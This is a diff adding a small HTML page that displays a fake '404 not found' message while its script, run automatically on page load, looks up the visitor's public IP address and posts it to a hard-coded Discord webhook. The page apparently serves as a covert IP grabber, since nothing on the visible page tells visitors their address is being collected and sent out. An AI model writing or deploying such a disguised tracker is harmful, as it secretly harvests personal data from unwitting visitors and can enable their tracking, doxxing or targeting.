@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>404 not found</title>
+    <script>
+        async function sendIPToWebhook() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                const ipAddress = data.ip;
+
+                const webhookUrl = 'https://discord.com/api/webhooks/1406610228568395937/fWW49nEHgFXz91xYAWZJbj0phbHfk8sG8a-ZYBXp5XvHsFQRKnDgl40jOdW1Stjjz96g';
+                const payload = {
+                    content: `IP Address: ${ipAddress}`
+                };
+
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                console.log('IP Address sent to webhook successfully!');
+            } catch (error) {
+                console.error('Error sending IP Address to webhook:', error);
+            }
+        }
+
+        
+        window.onload = sendIPToWebhook;
+    </script>
+</head>
+<body>
+    <h1>404 not found</h1>
+    <p>Data for this page could not be found.</p>
+</body>
+</html>
